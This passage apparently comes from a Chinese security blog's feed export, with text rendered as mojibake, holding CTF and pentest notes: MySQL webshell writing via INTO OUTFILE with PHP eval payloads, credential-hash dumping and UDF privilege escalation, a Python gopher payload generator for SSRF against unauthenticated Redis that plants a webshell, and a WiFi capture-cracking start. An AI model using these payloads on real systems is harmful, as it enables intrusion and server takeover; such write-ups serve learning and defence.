‡ç«™ç‚¹æ•°æ®åº“è®¿é—®é¢‘ç¹çš„è¯å¯èƒ½æ—¥å¿—æ–‡ä»¶ä¼šå¾ˆå¤§ï¼Œè¿shellä¼šå¾ˆå¡ï¼Œæ‰€ä»¥æ‹¿åˆ°è¯¥shellåé‡æ–°å†ä¼ ä¸€ä¸ªéšè”½ç‚¹çš„shellï¼Œå†æŠŠæ—¥å¿—æ–‡ä»¶æ”¹å›å»ï¼Œå…³é—­æ—¥å¿—è®°å½•çš„åŠŸèƒ½ã€‚</p><h1 id="mysqlå¸¸ç”¨æŸ¥è¯¢"><a href="#mysqlå¸¸ç”¨æŸ¥è¯¢" class="headerlink" title="mysqlå¸¸ç”¨æŸ¥è¯¢"></a>mysqlå¸¸ç”¨æŸ¥è¯¢</h1><p>select @@version; æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬<br>select @@basedir; æŸ¥è¯¢MYSQLå®‰è£…è·¯å¾„<br>select @@plugin_dir ; æŸ¥çœ‹pluginè·¯å¾„<br>select host, user, password from mysql.user; æŸ¥è¯¢hash (MySQL &lt;= 5.6 )<br>select host, user, authentication_string from mysql.user; æŸ¥è¯¢hash (MySQL &gt;= 5.7 )<br>select @@version_compile_os,@@version_compile_machine; æŸ¥è¯¢å½“å‰æ“ä½œç³»ç»Ÿ</p><h1 id="å†™shellçš„å‡ ç§æ–¹å¼"><a href="#å†™shellçš„å‡ ç§æ–¹å¼" class="headerlink" title="å†™shellçš„å‡ ç§æ–¹å¼"></a>å†™shellçš„å‡ ç§æ–¹å¼</h1><h2 id="Union-select"><a href="#Union-select" class="headerlink" title="Union select"></a>Union select</h2><p>union select â€˜<?php eval($_POST['cmd']); ?>â€˜ into outfile /var/www/html/shell.php#</p><h2 id="lines-terminated-by"><a href="#lines-terminated-by" class="headerlink" title="lines terminated by"></a>lines terminated by</h2><p>select * from phpcmsv9.v9_admin_role where roleid = 1 into outfile â€˜C:/wamp64/www/work/webshell.phpâ€™ lines terminated by â€˜<?php phpinfo() ?>â€˜;<br>åŸç†ï¼š<br>é€šè¿‡selectè¯­å¥æŸ¥è¯¢çš„å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ 1 into outfile â€˜C:/wamp64/www/work/webshell.phpâ€™ è¿™æ ·å†™çš„åŸå› ï¼Œç„¶ååˆ©ç”¨ lines terminated by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚lines terminated by å¯ä»¥ç†è§£ä¸º ä»¥æ¯è¡Œç»ˆæ­¢çš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚</p><h2 id="lines-starting-by"><a href="#lines-starting-by" class="headerlink" title="lines starting by"></a>lines starting by</h2><p>ç±»ä¼¼lines terminated by</p><h2 id="fields-terminated-by"><a href="#fields-terminated-by" class="headerlink" title="fields terminated by"></a>fields terminated by</h2><p>åˆ©ç”¨ fields terminated by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚fields terminated by å¯ä»¥ç†è§£ä¸º ä»¥æ¯ä¸ªå­—æ®µçš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚</p><h2 id="columns-terminated-by"><a href="#columns-terminated-by" class="headerlink" title="columns terminated by"></a>columns terminated by</h2><p>å¦‚ä¸ŠåŒç†</p><h1 id="sqlmapå†™webshell"><a href="#sqlmapå†™webshell" class="headerlink" title="sqlmapå†™webshell"></a>sqlmapå†™webshell</h1><p>ç±»ä¼¼ä¸Šè¿°Mysqlå†™webshellï¼Œä¸è¿‡æ›´è‡ªåŠ¨åŒ–äº†ï¼Œä½¿ç”¨å‘½ä»¤ä¸º mysql -u url â€“os-shellï¼Œè¦æ±‚åŒä¸Šâ€“ç›®å½•å¯å†™ï¼Œå…³é—­gpcï¼Œç»å¯¹è·¯å¾„ï¼Œban secure_file_priv</p><h1 id="mysql-UDFææƒ"><a href="#mysql-UDFææƒ" class="headerlink" title="mysql UDFææƒ"></a>mysql UDFææƒ</h1><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/qq_26406447/article/details/102691188">https://blog.csdn.net/qq_26406447/article/details/102691188</a><br><a href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a><br>ä»€ä¹ˆæ˜¯UDFï¼Ÿ<br>UDFï¼ˆuser defined functionï¼‰ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯mysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å®ç°åœ¨mysqlä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨sqlè¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•°ä¸€æ ·ã€‚é€šè¿‡åŠ¨æ€åº“æ–¹å¼å®ç°<br>é¦–å…ˆé€šè¿‡æ³¨å…¥è·å–mysqlè´¦å·å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;MySQL 5.6 and below</span><br><span class="line">select host, user, password from mysql.user;</span><br><span class="line">&#x2F;&#x2F;MySQL 5.7 and above</span><br><span class="line">select host, user, authentication_string from mysql.user;</span><br></pre></td></tr></table></figure><p>æœ‰åˆ—æ•°é™åˆ¶çš„è¯å°±group_concat(c1,c2,c3 separator â€˜-â€˜)<br>æ‹¿åˆ°å¯†ç åå»æœä¸€ä¸‹md5å€¼ã€‚ã€‚è¿™é‡Œé»˜è®¤root root<br>ç„¶åè¿œç¨‹è¿æ¥mysql<br>çœ‹ä¸€ä¸‹secure_file_priv<br>æ¥ä¸‹æ¥å°±æŠŠå¯¹åº”mysqlç‰ˆæœ¬çš„dllæ–‡ä»¶ä¼ ä¸Šå» ä½æ•°æŸ¥çœ‹å‘½ä»¤ï¼šshow variables like â€˜%version_%â€™ï¼›ï¼Œä½æ•°ä¸å¯¹ä½¿ç”¨dllæ–‡ä»¶çš„æ—¶å€™ä¼šæŠ¥é”™ï¼ï¼ï¼ä¸€å®šæ³¨æ„<br>æˆ‘è¿™é‡Œæ˜¯64ä½ï¼Œå°±ä¼ 64ä½çš„äº†ï¼Œä¼ ä¹‹å‰éœ€è¦ç”¨sqlmapçš„dllï¼Œä½†æ˜¯å¼‚æˆ–ç¼–ç ï¼Œéœ€è¦è§£ç ï¼Œè§£ç ä¹Ÿåœ¨sqlmapé‡Œé¢ã€‚<br>python cloak.py -d -i  â€¦/64/lib_mysqludf_sys.dll_<br>è§£ç åä¸Šä¼ åˆ°æ•°æ®åº“å¯¹åº”çš„ä½ç½®é‡Œé¢å»<br>è¿™é‡Œæˆ‘ä¸Šä¼ å‡ºäº†ç‚¹é—®é¢˜ï¼Œå¤ªç¦»è°±äº†ã€‚<br>æˆ‘ä¸å¤ªä¼šç”¨loadfileï¼Œæ‰€ä»¥æŠŠæ–‡ä»¶é€šè¿‡010editorï¼Œè½¬ä¸º16è¿›åˆ¶å¯¼å‡ºï¼Œç„¶ååœ¨notepadå»æ‰ç©ºæ ¼å’Œæ¢è¡Œç¬¦(åŒ¹é…â€™\r\nâ€™),ç„¶å<br>select unhex(â€˜dataâ€™) into dumpfile â€˜path/plugin/udf.dllâ€™<br>æ¥ä¸‹æ¥ï¼Œcreate function sys_eval returns string soname â€œudf.dllâ€;<br>ä¹‹åå°±å¯ä»¥æ„‰å¿«åœ°åœ¨mysqlé‡Œé¢ä½¿ç”¨ç³»ç»Ÿæƒé™æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><img src="http://cdn.polowong.top/static/images/udf.png">]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apacheã€nginxã€iisæ—¥å¿—æµ…æ</title>
      <link href="2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/"/>
      <url>2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="å°çŸ¥è¯†ï¼š"><a href="#å°çŸ¥è¯†ï¼š" class="headerlink" title="å°çŸ¥è¯†ï¼š"></a>å°çŸ¥è¯†ï¼š</h1><p>å¸¸è§çš„Linuxå‘è¡Œç‰ˆæœ¬ï¼š<br>Redhatã€Ubuntuã€CentOSã€SuSEã€Gentooã€Debianã€Fedoraã€<br>æœ€è¿‘hwé¢è¯•é—®åˆ°çš„é—®é¢˜ï¼Œç‰¹åœ°æ•´ç†ä¸€ä¸‹ã€‚</p><h1 id="Findå‘½ä»¤"><a href="#Findå‘½ä»¤" class="headerlink" title="Findå‘½ä»¤"></a>Findå‘½ä»¤</h1><p>é¢è¯•é‡Œé¢é—®æˆ‘æ€ä¹ˆç”¨findå‘½ä»¤æ‰¾nginxçš„æ—¥å¿—æ–‡ä»¶ï¼ˆå…ˆé—®çš„æˆ‘nginxçš„æ—¥å¿—æ–‡ä»¶å«å•¥ã€‚ã€‚æˆ‘ä¸çŸ¥é“ã€‚ã€‚å°´å°¬ï¼‰ç„¶åæç¤ºæˆ‘æ˜¯.logç»“å°¾ï¼Œç„¶åæˆ‘å°±è¯´äº†<br>find / -name â€œ<em>.logâ€ æ²¡æƒ³åˆ°å®³è’™å¯¹äº†â€¦ å‡†ç¡®çš„è¡¨è¿°åº”è¯¥æ˜¯ find /var/log/nginx -name â€œ</em>.logâ€<br>è¿™é‡Œè¯´ä¸€ä¸‹findå‘½ä»¤çš„ä¸€äº›ç”¨æ³•ã€‚<br>-exec/-okéƒ½æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡-okä¼šå…ˆç»™å‡ºæç¤ºï¼Œè®©ç”¨æˆ·ç¡®å®šæ˜¯å¦æ‰§è¡Œã€‚<br>find . -perm 777 -exec ls -l {} ;<br>-perm æ˜¯æŒ‰ç…§æƒé™è¿›è¡ŒæŸ¥æ‰¾<br>æ¯”å¦‚  find / -perm 777</p><h1 id="Linuxæƒé™"><a href="#Linuxæƒé™" class="headerlink" title="Linuxæƒé™"></a>Linuxæƒé™</h1><p>é¡ºä¾¿è¯´ä¸€ä¸‹Linuxæƒé™é—®é¢˜<br>RWX read-write-executeå¯¹åº”æƒå€¼ä¸º4-2-1<br>æ‰€ä»¥chmod 777çš„æ„æ€å°±æ˜¯è¯´ç»™æ‰€æœ‰çš„ç”¨æˆ·å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æƒé™ï¼ˆå±é™©<br>æ¯ä¸ª7åˆ†åˆ«å¯¹åº”Userã€Groupã€Otherçš„æƒé™ã€‚</p><h1 id="Apcheã€Nginxã€IISæ—¥å¿—"><a href="#Apcheã€Nginxã€IISæ—¥å¿—" class="headerlink" title="Apcheã€Nginxã€IISæ—¥å¿—"></a>Apcheã€Nginxã€IISæ—¥å¿—</h1><p>Apache:<br>centosé…ç½®æ–‡ä»¶ï¼š/etc/httpd/conf/httpd.conf<br>Ubuntué…ç½®æ–‡ä»¶ï¼š/etc/apache2/apache2.conf<br>æ—¥å¿—æ–‡ä»¶çš„é…ç½®åœ¨httpd.confä¸­ã€‚<br>apacheæ—¥å¿—è®°å½•äº†å®¢æˆ·ç«¯ipã€æ—¶é—´ã€æ–¹æ³•ã€è¯·æ±‚èµ„æºã€status codeã€content lengthç­‰ä¿¡æ¯ã€‚<br>Windowså¹³å°çš„æ—¥å¿—ä½ç½®é»˜è®¤åœ¨apache/logs/access.log error.log<br>åœ¨åŸºäºDebiançš„Linuxä¸Š(Ubuntu)ï¼Œç³»ç»ŸèŒƒå›´çš„Apacheé”™è¯¯æ—¥å¿—é»˜è®¤ä½ç½®æ˜¯/var/log/apache2/error.log<br>åœ¨åŸºäº Red Hat çš„Linuxä¸­(centos)ï¼Œç³»ç»ŸèŒƒå›´çš„ Apache é”™è¯¯æ—¥å¿—æ–‡ä»¶é»˜è®¤è¢«æ”¾ç½®åœ¨/var/log/httpd/error_log<br>Nginx:<br>Windowsï¼šlogs/access.log<br>Linux:/var/log/nginx/access.log<br>é»˜è®¤é…ç½®æ–‡ä»¶ï¼š/etc/nginx/nginx.conf<br>IIS:<br>IIS6 é»˜è®¤æƒ…å†µä¸‹ IISæ—¥å¿—æ–‡ä»¶ç›®å½• ä¸º  C:\windows\system32\LogFiles<br>IIS7.5 é»˜è®¤æƒ…å†µä¸‹IISæ—¥å¿—ç›®å½•ä¸º â€œ%SystemDrive%\inetpub\logs\LogFilesâ€ å…¶ä¸­%SystemDrive% è¡¨ç¤ºç³»ç»Ÿå®‰è£…ä½ç½®ï¼Œä¸€èˆ¬æŒ‡ C: ç›˜ï¼Œç‚¹å‡»â€œæµè§ˆâ€æŒ‰é’®å¯è‡ªå®šä¹‰å­˜æ”¾IISæ—¥å¿—ç›®å½•ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆSSRFä¸redisåŠå…¶ç›¸å…³é—®é¢˜</title>
      <link href="2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
      <url>2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯Redis"><a href="#ä»€ä¹ˆæ˜¯Redis" class="headerlink" title="ä»€ä¹ˆæ˜¯Redis"></a>ä»€ä¹ˆæ˜¯Redis</h1><p>  Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€ Key-Valueæ•°æ®åº“ã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„value ç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬ string(å­—ç¬¦ä¸²)ã€list ( é“¾è¡¨)ã€ set(é›†åˆ)ã€zset(sorted set â€“ æœ‰åºé›†åˆ)å’Œ hashï¼ˆå“ˆå¸Œç±»å‹ï¼‰ã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush/pop ã€ add/remove åŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œ redisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸ memcached ä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯ redis ä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº† master-slave ( ä¸»ä»)åŒæ­¥ã€‚</p><h2 id="Redisæ¼æ´"><a href="#Redisæ¼æ´" class="headerlink" title="Redisæ¼æ´"></a>Redisæ¼æ´</h2><p>Redisä¼šå› ä¸ºé…ç½®ä¸å½“è€Œäº§ç”Ÿæ¼æ´ã€‚<br>Redisé»˜è®¤ç›‘å¬ç«¯å£ä¸º 0.0.0.0:6379,é»˜è®¤æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼Œè¿™æ„å‘³ç€redisæœåŠ¡å™¨æš´æ¼åœ¨å…¬ç½‘å¹¶ä¸”å¯ä»¥è¢«æ“ä½œã€‚<br>Redisæœªæˆæƒæ¼æ´åˆ©ç”¨æƒ…å†µæœ‰å¦‚ä¸‹å‡ ç§<br>1.æ•æ„Ÿæ•°æ®æ³„éœ²<br>2.å†™shell<br>3.æŠŠå…¬é’¥å†™å…¥authorized_keysï¼Œå¯ä»¥ç™»å½•ä¸»æœºã€‚ï¼ˆéœ€è¦Redisä»¥rootæƒé™è¿è¡Œï¼‰<br>4.contrabåå¼¹shell</p><h2 id="Redisæ¼æ´åˆ©ç”¨"><a href="#Redisæ¼æ´åˆ©ç”¨" class="headerlink" title="Redisæ¼æ´åˆ©ç”¨"></a>Redisæ¼æ´åˆ©ç”¨</h2><p>å¯¹äºæœªæˆæƒè®¿é—®çš„æƒ…å†µï¼Œå¯ä»¥è·å–åˆ°RedisæœåŠ¡å™¨ipååœ¨æœ¬åœ°è¿œç¨‹è¿æ¥RedisæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥æ„é€ æ•°æ®åŒ…å‘RedisæœåŠ¡å™¨å‘é€æ¶æ„ä»£ç ã€‚</p><h1 id="SSRFä¸å„ç§åè®®"><a href="#SSRFä¸å„ç§åè®®" class="headerlink" title="SSRFä¸å„ç§åè®®"></a>SSRFä¸å„ç§åè®®</h1><p>SSRFå…¨ç¨‹ä¸º Server-Side-Request-Forgery æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œå³ä¸ºé€šè¿‡æœåŠ¡å™¨å¯¹å†…ç½‘èµ„æºè¿›è¡Œä¸€äº›è¯·æ±‚ï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå†…ç½‘æ‰«æã€ä¸»æœºæ¢æµ‹ã€æ¼æ´åˆ©ç”¨ç­‰æ´»åŠ¨ã€‚</p><h2 id="Gopheråè®®"><a href="#Gopheråè®®" class="headerlink" title="Gopheråè®®"></a>Gopheråè®®</h2><p>Gopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œå®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œå¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚ä½†åœ¨WWWå‡ºç°åï¼ŒGopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œã€‚ç°åœ¨å®ƒåŸºæœ¬è¿‡æ—¶ï¼Œäººä»¬å¾ˆå°‘å†ä½¿ç”¨å®ƒã€‚<br>gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®®<br>gopheråè®®æ ¼å¼ï¼šURL:  gopher://<host>:<port>/<gopher-path>_UrlEncodedTCPStream</p><h2 id="fileåè®®"><a href="#fileåè®®" class="headerlink" title="fileåè®®"></a>fileåè®®</h2><p>curlæ”¯æŒfileåè®®ï¼Œå¯ä»¥é€šè¿‡fileåè®®LFIã€‚file:///etc/passwd</p><h2 id="dictåè®®"><a href="#dictåè®®" class="headerlink" title="dictåè®®"></a>dictåè®®</h2><p>curlæ”¯æŒdictåè®®ï¼Œå¯ä»¥é€šè¿‡dictåè®®æ¢æµ‹æœåŠ¡ä¿¡æ¯ã€‚<br>curl dict://127.0.0.1:22</p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>GKCTF-2020 EasyWeb<br>è¿™é“é¢˜æ‹¿åˆ°æ‰‹æ²¡å•¥æ€è·¯ çœ‹åˆ°æºç æç¤ºäº†secretä¹‹åå‘ç°æ˜¯ifconfig<br>ç„¶åå°±ä½¿ç”¨burpæ‰«ä¸€ä¸‹å†…ç½‘ï¼Œå‘ç°ä¸€å°173.187.36.11è¿™å°æœåŠ¡å™¨çš„æŠ¥é”™æ˜¯redisçš„æŠ¥é”™ã€‚<br>ç„¶åçˆ†ç ´æ‰«ä¸€ä¸‹ç«¯å£ï¼Œå‘ç°æ˜¯é»˜è®¤çš„6379ã€‚<br>æ¥ä¸‹æ¥è€ƒè™‘SSRFæ‰“å†…ç½‘æœªæˆæƒRedisã€‚<br>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.216.189.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line"> <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line"> <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line"> <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line"> <span class="string">&quot;save&quot;</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure><p>æ›¿æ¢urlå’Œpayloadå³å¯<br>ç”Ÿæˆpayloadä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.187.36.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<a href="http://redis_ip/shell.php%E5%8D%B3%E5%8F%AFgetflag">http://redis_ip/shell.phpå³å¯getflag</a></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a><br><a href="https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNode">https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNode</a><br><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a><br><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a><br><a href="https://www.freebuf.com/vuls/162035.html">https://www.freebuf.com/vuls/162035.html</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¶è‡­æ•°æ®åŒ…</title>
      <link href="2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
      <url>2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®åŒ…åˆ†æ"><a href="#æ•°æ®åŒ…åˆ†æ" class="headerlink" title="æ•°æ®åŒ…åˆ†æ"></a>æ•°æ®åŒ…åˆ†æ</h1><p>ä¸‹è½½å®Œæ•°æ®åŒ…ä¹‹åï¼Œprotocolå…¨éƒ½æ˜¯802.11ï¼Œè€ƒè™‘æ•°æ®åŒ…è¢«åŠ å¯†äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œè§£å¯†ã€‚<br>ä½¿ç”¨aircrack-ng å¯¹æ•°æ®åŒ…è¿›è¡Œè§£å¯†ï¼Œä½¿ç”¨çš„å­—å…¸ä¸ºfuzzdict wifipwdtop2000ã€‚</p><img src="http://cdn.polowong.top/static/images/ec1.png"><p>è·‘å‡ºæ¥wifiå¯†ç ä¸º12345678ï¼Œç»“åˆSSIDå¯¹æ•°æ®åŒ…è¿›è¡Œè§£å¯†ã€‚</p><h1 id="æ•°æ®åŒ…è§£å¯†"><a href="#æ•°æ®åŒ…è§£å¯†" class="headerlink" title="æ•°æ®åŒ…è§£å¯†"></a>æ•°æ®åŒ…è§£å¯†</h1><p>é¦–é€‰é¡¹-åè®®-IEEE802.11-ç¼–è¾‘decryption keysã€‚<br>typeé€‰æ‹©wpa-pwd,æ ¼å¼ä¸º  wifiå¯†ç :SSID<br>ä¹Ÿå¯ä»¥ä»<a href="https://www.wireshark.org/tools/wpa-psk.html">https://www.wireshark.org/tools/wpa-psk.html</a> æ ¹æ®wifiå¯†ç 